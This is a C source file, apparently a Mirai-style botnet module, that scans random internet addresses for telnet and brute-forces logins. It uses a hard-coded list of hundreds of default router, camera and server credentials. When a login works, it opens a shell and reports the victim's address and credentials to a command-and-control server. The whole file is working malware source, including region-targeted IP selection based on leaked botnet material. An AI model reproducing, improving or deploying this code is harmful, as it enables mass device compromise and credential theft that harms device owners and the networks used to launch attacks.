#include "includes.h"
#include "scanner.h"
#include "rand.h"
#include "table.h"
#include "util.h"

#ifdef SELFREP

/* ============================================================================
 * TELNET SCANNER - Self-Replication Module
 * ============================================================================
 * Reduced scanner settings to prevent crashes and network saturation
 * Scans for vulnerable telnet devices and brute-forces credentials
 * Reports successful logins back to C&C server
 * ============================================================================ */

/* Reduced scanner settings to prevent crashes and network saturation */
#define SCANNER_MAX_CONNS 64          /* Reduced from 256 - prevents resource exhaustion */
#define SCANNER_RAW_PPS 32            /* Reduced from 384 - slower scan rate */
#define SCANNER_CONNECTION_DELAY 500  /* Milliseconds between new connections */

/* Scanner states */
#define SC_CLOSED 0
#define SC_CONNECTING 1
#define SC_HANDLE_IACS 2
#define SC_WAITING_USERNAME 3
#define SC_WAITING_PASSWORD 4
#define SC_WAITING_PASSWD_RESP 5
#define SC_WAITING_ENABLE_RESP 6
#define SC_WAITING_SYSTEM_RESP 7
#define SC_WAITING_SHELL_RESP 8
#define SC_WAITING_SH_RESP 9
#define SC_WAITING_TOKEN_RESP 10

/* Credential structure */
struct scanner_credential {
    char *username;
    char *password;
};

/* Connection structure */
struct scanner_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
    int cred_index;  /* Current credential index being tried */
};

static struct scanner_connection conns[SCANNER_MAX_CONNS];
static int conn_count = 0;

/* Telnet negotiation bytes */
static uint8_t iac_buf[10];
static int iac_pos = 0;

/* Sample credentials - expand with full list from all three codebases */
static struct scanner_credential credentials[] = {
    {"root", "root"},
    {"root", "123456"},
    {"root", "admin"},
    {"root", "password"},
    {"root", "vizxv"},
    {"root", "xc3511"},
    {"root", "1234"},
    {"root", "12345"},
    {"root", "123456789"},
    {"root", "000000"},
    {"root", "default"},
    {"root", "pass"},
    {"root", "test"},
    {"root", "guest"},
    {"root", "master"},
    {"root", "changeme"},
    {"root", "12345678"},
    {"root", "qwerty"},
    {"root", "abc123"},
    {"root", "monkey"},
    {"root", "letmein"},
    {"root", "dragon"},
    {"root", "baseball"},
    {"root", "iloveyou"},
    {"root", "trustno1"},
    {"root", "sunshine"},
    {"root", "princess"},
    {"root", "welcome"},
    {"root", "shadow"},
    {"root", "superman"},
    {"root", "michael"},
    {"root", "football"},
    {"root", "starwars"},
    {"admin", "admin"},
    {"admin", "password"},
    {"admin", "123456"},
    {"admin", "admin123"},
    {"admin", "root"},
    {"admin", "letmein"},
    {"admin", "welcome"},
    {"admin", "monkey"},
    {"admin", "dragon"},
    {"admin", "master"},
    {"admin", "qwerty"},
    {"admin", "login"},
    {"admin", "princess"},
    {"admin", "sunshine"},
    {"admin", "password1"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"support", "support"},
    {"support", "password"},
    {"support", "admin"},
    {"support", "123456"},
    {"support", "root"},
    {"support", "support123"},
    {"guest", "guest"},
    {"guest", "password"},
    {"guest", "admin"},
    {"guest", "123456"},
    {"guest", "guest123"},
    {"user", "user"},
    {"user", "password"},
    {"user", "admin"},
    {"user", "123456"},
    {"user", "user123"},
    {"default", "default"},
    {"default", "password"},
    {"default", "admin"},
    {"default", "123456"},
    {"manager", "manager"},
    {"manager", "password"},
    {"manager", "admin"},
    {"manager", "manager123"},
    {"operator", "operator"},
    {"operator", "password"},
    {"operator", "admin"},
    {"test", "test"},
    {"test", "password"},
    {"test", "admin"},
    {"test", "123456"},
    {"service", "service"},
    {"service", "password"},
    {"service", "admin"},
    {"supervisor", "supervisor"},
    {"supervisor", "password"},
    {"supervisor", "admin"},
    {"supervisor", "supervisor123"},
    {"tech", "tech"},
    {"tech", "password"},
    {"tech", "admin"},
    {"technician", "technician"},
    {"technician", "password"},
    {"webadmin", "webadmin"},
    {"webadmin", "password"},
    {"webadmin", "admin"},
    {"webadmin", "webadmin123"},
    {"oracle", "oracle"},
    {"oracle", "password"},
    {"mysql", "mysql"},
    {"mysql", "password"},
    {"postgres", "postgres"},
    {"postgres", "password"},
    {"ftpuser", "ftpuser"},
    {"ftpuser", "password"},
    {"backup", "backup"},
    {"backup", "password"},
    {"nagios", "nagios"},
    {"nagios", "password"},
    {"tomcat", "tomcat"},
    {"tomcat", "password"},
    {"jenkins", "jenkins"},
    {"jenkins", "password"},
    {"pi", "raspberry"},
    {"pi", "pi"},
    {"ubuntu", "ubuntu"},
    {"centos", "centos"},
    {"vagrant", "vagrant"},
    {"ansible", "ansible"},
    {"docker", "docker"},
    {"git", "git"},
    {"svn", "svn"},
    {"www-data", "www-data"},
    {"apache", "apache"},
    {"nginx", "nginx"},
    {"http", "http"},
    {"ftp", "ftp"},
    {"mail", "mail"},
    {"postfix", "postfix"},
    {"dovecot", "dovecot"},
    {"bind", "bind"},
    {"named", "named"},
    {"ldap", "ldap"},
    {"radius", "radius"},
    {"proxy", "proxy"},
    {"squid", "squid"},
    {"snmp", "snmp"},
    {"public", "public"},
    {"private", "private"},
    {"community", "community"},
    {"cisco", "cisco"},
    {"huawei", "huawei"},
    {"zte", "zte"},
    {"hikvision", "hikvision"},
    {"dahua", "dahua"},
    {"axis", "axis"},
    {"bosch", "bosch"},
    {"samsung", "samsung"},
    {"lg", "lg"},
    {"sony", "sony"},
    {"panasonic", "panasonic"},
    {"canon", "canon"},
    {"epson", "epson"},
    {"hp", "hp"},
    {"dell", "dell"},
    {"ibm", "ibm"},
    {"lenovo", "lenovo"},
    {"asus", "asus"},
    {"acer", "acer"},
    {"netgear", "netgear"},
    {"linksys", "linksys"},
    {"dlink", "dlink"},
    {"tplink", "tplink"},
    {"belkin", "belkin"},
    {"arris", "arris"},
    {"motorola", "motorola"},
    {"technicolor", "technicolor"},
    {"thomson", "thomson"},
    {"alcatel", "alcatel"},
    {"siemens", "siemens"},
    {"ericsson", "ericsson"},
    {"nokia", "nokia"},
    {"ubnt", "ubnt"},
    {"mikrotik", "mikrotik"},
    {"ruckus", "ruckus"},
    {"aruba", "aruba"},
    {"extreme", "extreme"},
    {"avaya", "avaya"},
    {"juniper", "juniper"},
    {"fortinet", "fortinet"},
    {"paloalto", "paloalto"},
    {"checkpoint", "checkpoint"},
    {"sonicwall", "sonicwall"},
    {"watchguard", "watchguard"},
    {"barracuda", "barracuda"},
    {"f5", "f5"},
    {"citrix", "citrix"},
    {"vmware", "vmware"},
    {"root", "xmhdipc"},
    {"root", "juantech"},
    {"root", "1234567890"},
    {"root", "54321"},
    {"root", "pass123"},
    {"root", "root123"},
    {"root", "admin123"},
    {"root", "qweasdzxc"},
    {"root", "zaq12wsx"},
    {"root", "password123"},
    {"root", "admin@123"},
    {"root", "root@123"},
    {"admin", "admin@123"},
    {"admin", "admin1234"},
    {"admin", "administrator"},
    {"admin", "administrator123"},
    {"admin", "pass@123"},
    {"admin", "password123"},
    {"root", "klv123"},
    {"root", "klv1234"},
    {"root", "7ujMko0vizxv"},
    {"root", "7ujMko0admin"},
    {"root", "system"},
    {"root", "ikwb"},
    {"root", "dreambox"},
    {"root", "user1234"},
    {"root", "pass1234"},
    {"root", "111111"},
    {"root", "666666"},
    {"root", "888888"},
    {"root", "654321"},
    {"root", "a1b2c3"},
    {"root", "1q2w3e"},
    {"root", "1q2w3e4r"},
    {"root", "1qaz2wsx"},
    {"root", "q1w2e3"},
    {"root", "q1w2e3r4"},
    {"admin", "smcadmin"},
    {"admin", "4321"},
    {"admin", "1111"},
    {"admin", "pass"},
    {"admin", "meinsm"},
    {"admin", "cat1029"},
    {"admin", "20080808"},
    {"admin", "1234abcd"},
    {"admin", "abcd1234"},
    {"admin", "qwerty123"},
    {"admin", "letmein123"},
    {"admin", "password1"},
    {"admin", "p@ssw0rd"},
    {"admin", "P@ssw0rd"},
    {"admin", "Passw0rd"},
    {"admin", "Password1"},
    {"admin", "Password123"},
    {"admin", "Admin123"},
    {"admin", "Admin@123"},
    {"root", "Zte521"},
    {"root", "tl789"},
    {"root", "hs7m0dd"},
    {"root", "telnet"},
    {"root", "tasmota"},
    {"root", "Password1234"},
    {"root", "12345678910"},
    {"root", "rootroot"},
    {"root", "toor"},
    {"root", "p@ss"},
    {"root", "p@ssword"},
    {"root", "passw0rd"},
    {"root", "Passw0rd"},
    {"root", "Password1"},
    {"root", "Password123"},
    {"root", "Root123"},
    {"root", "Root@123"},
    {NULL, NULL}
};

static void scanner_connect(struct scanner_connection *);
static void scanner_close(struct scanner_connection *);
static void scanner_handle_recv(struct scanner_connection *);
static ipv4_t get_random_ip(void);
static BOOL is_rfc1918(ipv4_t);

void scanner_init(void) {
    int i;
    time_t last_connect_time = 0;
    time_t now = 0;

    if (fork() == 0) {
        /* Initialize connections */
        for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = SC_CLOSED;
        }

        srand(time(NULL));

        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            time_t now = time(NULL);

            FD_ZERO(&fdset);

            /* Add all active connections to fdset */
            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (conns[i].state != SC_CLOSED) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }

            tv.tv_sec = 1;
            tv.tv_usec = 0;

            int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);

            /* Check for timeouts */
            now = time(NULL);
            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (conns[i].state != SC_CLOSED && now - conns[i].last_recv > 30) {
                    scanner_close(&conns[i]);
                }
            }

            /* Process readable sockets */
            if (nfds > 0) {
                for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                    if (conns[i].state != SC_CLOSED && FD_ISSET(conns[i].fd, &fdset)) {
                        scanner_handle_recv(&conns[i]);
                    }
                }
            }

            /* Start new connections with rate limiting */
            time_t current_time = time(NULL);
            if (current_time - last_connect_time >= (SCANNER_CONNECTION_DELAY / 1000)) {
                for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                    if (conns[i].state == SC_CLOSED) {
                        conns[i].dst_addr = get_random_ip();
                        conns[i].dst_port = 23;
                        scanner_connect(&conns[i]);
                        last_connect_time = current_time;
                        break;
                    }
                }
            }
        }
    }
}

static void scanner_connect(struct scanner_connection *conn) {
    struct sockaddr_in addr;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));

    conn->state = SC_CONNECTING;
    conn->connect_time = time(NULL);
    conn->last_recv = time(NULL);
    iac_pos = 0;  /* Reset IAC position */
}

static void scanner_close(struct scanner_connection *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
    conn->state = SC_CLOSED;
}

static void scanner_handle_recv(struct scanner_connection *conn) {
    char buf[4096];
    int n;
    
    n = recv(conn->fd, buf, sizeof(buf), 0);
    if (n <= 0) {
        scanner_close(conn);
        return;
    }
    
    conn->last_recv = time(NULL);
    
    /* Handle telnet negotiation */
    if (conn->state == SC_CONNECTING || conn->state == SC_HANDLE_IACS) {
        int i;
        for (i = 0; i < n; i++) {
            if (buf[i] == 0xFF) {
                conn->state = SC_HANDLE_IACS;
                iac_buf[iac_pos++] = buf[i];
            } else if (conn->state == SC_HANDLE_IACS) {
                iac_buf[iac_pos++] = buf[i];
                if (iac_pos >= 3) {
                    /* Send telnet option response */
                    uint8_t resp[3];
                    if (iac_buf[1] == 0xFD || iac_buf[1] == 0xFE) {
                        resp[0] = 0xFF;
                        resp[1] = 0xFC;
                        resp[2] = iac_buf[2];
                        send(conn->fd, resp, 3, 0);
                    }
                    iac_pos = 0;
                }
            }
        }
        
        /* Check if negotiation complete */
        if (iac_pos == 0 && n > 0) {
            conn->state = SC_WAITING_USERNAME;

            /* Try current credential */
            if (credentials[conn->cred_index].username == NULL) {
                /* No more credentials, close connection */
                scanner_close(conn);
                return;
            }

            char *username = credentials[conn->cred_index].username;
            char *password = credentials[conn->cred_index].password;

            send(conn->fd, username, util_strlen(username), 0);
            send(conn->fd, "\r\n", 2, 0);

            conn->state = SC_WAITING_PASSWORD;
        }
        return;
    }

    /* State machine for login */
    switch (conn->state) {
        case SC_WAITING_PASSWORD:
            if (util_stristr(buf, n, "login") || util_stristr(buf, n, "username")) {
                /* Send password */
                char *password = credentials[conn->cred_index].password;
                send(conn->fd, password, util_strlen(password), 0);
                send(conn->fd, "\r\n", 2, 0);
                conn->state = SC_WAITING_PASSWD_RESP;
            }
            break;

        case SC_WAITING_PASSWD_RESP:
            if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") ||
                util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect") ||
                util_stristr(buf, n, "wrong") || util_stristr(buf, n, "denied")) {
                /* Login failed, try next credential */
                conn->cred_index++;
                scanner_close(conn);
            } else {
                /* Try to get shell */
                send(conn->fd, "shell\r\n", 7, 0);
                conn->state = SC_WAITING_SHELL_RESP;
            }
            break;
            
        case SC_WAITING_SHELL_RESP:
            if (util_stristr(buf, n, "shell") || util_stristr(buf, n, "#") ||
                util_stristr(buf, n, "$") || util_stristr(buf, n, ">")) {
                /* Got shell - report to C&C */
                uint8_t report[32];
                uint32_t addr = conn->dst_addr;
                uint16_t port = htons(conn->dst_port);
                char *username = credentials[conn->cred_index].username;
                char *password = credentials[conn->cred_index].password;
                int user_len = util_strlen(username);
                int pass_len = util_strlen(password);

                report[0] = (addr >> 24) & 0xFF;
                report[1] = (addr >> 16) & 0xFF;
                report[2] = (addr >> 8) & 0xFF;
                report[3] = addr & 0xFF;
                report[4] = (port >> 8) & 0xFF;
                report[5] = port & 0xFF;
                report[6] = (uint8_t)user_len;
                memcpy(report + 7, username, user_len);
                report[7 + user_len] = (uint8_t)pass_len;
                memcpy(report + 8 + user_len, password, pass_len);

                int fd = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in cnc;
                cnc.sin_family = AF_INET;
                cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
                cnc.sin_port = htons(SCAN_CB_PORT);

                if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
                    send(fd, report, 8 + user_len + pass_len, 0);
                }
                close(fd);

                scanner_close(conn);
            } else {
                scanner_close(conn);
            }
            break;
            
        default:
            scanner_close(conn);
            break;
    }
}

static ipv4_t get_random_ip(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target IoT devices - telnet scanners
         * Combined: Existing ranges + IllusionSec DDOS-archive leaks
         * Global coverage: All regions with IoT device deployments
         * Focus: Asia, Latin America, Africa, Middle East, Europe
         * Devices: Routers, cameras, IoT with weak telnet creds
         * Source: github.com/illusionsec/DDOS-archive/tree/main/leaks
         */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Africa - Major concentration from leaks */
        if (first_octet == 197 || first_octet == 196 || first_octet == 195 ||
            first_octet == 194 || first_octet == 193 || first_octet == 192 ||
            first_octet == 165 || first_octet == 164 || first_octet == 163 ||
            first_octet == 162 || first_octet == 161 || first_octet == 160 ||
            first_octet == 159 || first_octet == 158 || first_octet == 157 ||
            first_octet == 156 || first_octet == 155 || first_octet == 154 ||
            first_octet == 153 || first_octet == 152 || first_octet == 151 ||
            first_octet == 150 || first_octet == 149 || first_octet == 105 ||
            first_octet == 102) {
            break;
        }

        /* Latin America */
        if (first_octet == 201 || first_octet == 200 || first_octet == 191 ||
            first_octet == 190 || first_octet == 189 || first_octet == 187 ||
            first_octet == 186 || first_octet == 181 || first_octet == 180 ||
            first_octet == 179 || first_octet == 177) {
            break;
        }

        /* Asia - IoT hotspot */
        if (first_octet == 223 || first_octet == 222 || first_octet == 221 ||
            first_octet == 220 || first_octet == 219 || first_octet == 218 ||
            first_octet == 211 || first_octet == 210 || first_octet == 203 ||
            first_octet == 202 || first_octet == 125 || first_octet == 124 ||
            first_octet == 123 || first_octet == 122 || first_octet == 121 ||
            first_octet == 120 || first_octet == 119 || first_octet == 118 ||
            first_octet == 117 || first_octet == 116 || first_octet == 115 ||
            first_octet == 114 || first_octet == 113 || first_octet == 112 ||
            first_octet == 111 || first_octet == 110 || first_octet == 109 ||
            first_octet == 108 || first_octet == 107 || first_octet == 106 ||
            first_octet == 104 || first_octet == 103 || first_octet == 101) {
            break;
        }

        /* Middle East */
        if (first_octet == 95 || first_octet == 94 || first_octet == 93 ||
            first_octet == 92 || first_octet == 91 || first_octet == 90 ||
            first_octet == 89 || first_octet == 88 || first_octet == 87 ||
            first_octet == 86 || first_octet == 85 || first_octet == 84 ||
            first_octet == 83 || first_octet == 82 || first_octet == 81 ||
            first_octet == 80) {
            break;
        }

        /* Europe */
        if (first_octet == 79 || first_octet == 78 || first_octet == 77 ||
            first_octet == 76 || first_octet == 75 || first_octet == 74 ||
            first_octet == 73 || first_octet == 72 || first_octet == 71 ||
            first_octet == 70 || first_octet == 69 || first_octet == 68 ||
            first_octet == 67 || first_octet == 66 || first_octet == 65 ||
            first_octet == 64 || first_octet == 63 || first_octet == 62 ||
            first_octet == 61 || first_octet == 60 || first_octet == 59 ||
            first_octet == 58 || first_octet == 57 || first_octet == 56 ||
            first_octet == 55 || first_octet == 54 || first_octet == 53 ||
            first_octet == 52 || first_octet == 51 || first_octet == 50 ||
            first_octet == 49 || first_octet == 48 || first_octet == 47 ||
            first_octet == 46) {
            break;
        }

        /* North America */
        if (first_octet == 45 || first_octet == 44 || first_octet == 43 ||
            first_octet == 42 || first_octet == 41 || first_octet == 40 ||
            first_octet == 39 || first_octet == 38 || first_octet == 37 ||
            first_octet == 36 || first_octet == 35 || first_octet == 34 ||
            first_octet == 31 || first_octet == 27 || first_octet == 23 ||
            first_octet == 20 || first_octet == 18 || first_octet == 17 ||
            first_octet == 16 || first_octet == 15 || first_octet == 14 ||
            first_octet == 13 || first_octet == 9 || first_octet == 8 ||
            first_octet == 5 || first_octet == 4 || first_octet == 3 ||
            first_octet == 2 || first_octet == 1) {
            break;
        }
    }

    return addr;
}

static BOOL is_rfc1918(ipv4_t addr) {
    uint8_t *octets = (uint8_t *)&addr;
    
    /* 10.0.0.0/8 */
    if (octets[0] == 10) return TRUE;
    
    /* 172.16.0.0/12 */
    if (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) return TRUE;
    
    /* 192.168.0.0/16 */
    if (octets[0] == 192 && octets[1] == 168) return TRUE;
    
    return FALSE;
}

#endif
